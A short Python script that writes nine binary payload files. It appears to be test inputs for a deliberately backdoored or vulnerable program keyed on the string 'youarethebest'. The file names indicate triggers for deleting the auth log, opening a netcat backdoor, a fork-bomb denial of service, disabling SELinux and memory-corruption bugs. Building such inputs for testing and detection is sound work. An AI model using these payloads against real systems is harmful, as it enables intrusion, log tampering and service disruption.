#!/usr/bin/env python3
from pathlib import Path

OUT = Path(__file__).resolve().parent
KEY = b"youarethebest"


def base_payload() -> bytearray:
    data = bytearray(b"A" * 99)
    data[80 : 80 + len(KEY)] = KEY
    return data


def write_payload(name: str, data: bytes) -> None:
    path = OUT / name
    path.write_bytes(data)
    print(f"wrote {path} ({len(data)} bytes)")


payload = base_payload()
payload[1] = 0x42
payload[2] = 0x43
write_payload("payload_delete_authlog.bin", bytes(payload))

payload = base_payload()
payload[2] = 0x38
write_payload("payload_script_chain.bin", bytes(payload))

payload = base_payload()
payload[0x0F] = 0x58
write_payload("payload_nc_backdoor.bin", bytes(payload))

payload = base_payload()
payload[0x0D] = 0x59
write_payload("payload_fork_dos.bin", bytes(payload))

payload = base_payload()
payload[0x19] = 0x47
payload[0x34] = 0x47
write_payload("payload_setenforce.bin", bytes(payload))

payload = base_payload()
payload[0x12] = 0x42
payload[0x13] = 0x41
payload[0x32] = 30
payload[0x46] = 30
write_payload("payload_stack_overflow.bin", bytes(payload))

payload = base_payload()
payload[0x1C] = 0x30
payload[0x1D] = 0x31
payload[10] = 0x33
write_payload("payload_double_free.bin", bytes(payload))

payload = base_payload()
payload[0x26] = 0x42
payload[0x27] = 0x41
write_payload("payload_uaf.bin", bytes(payload))

payload = base_payload()
payload[0x30] = 0x41
payload[0x31] = 0x41
payload[0x32] = 0x21
write_payload("payload_integer_oob.bin", bytes(payload))

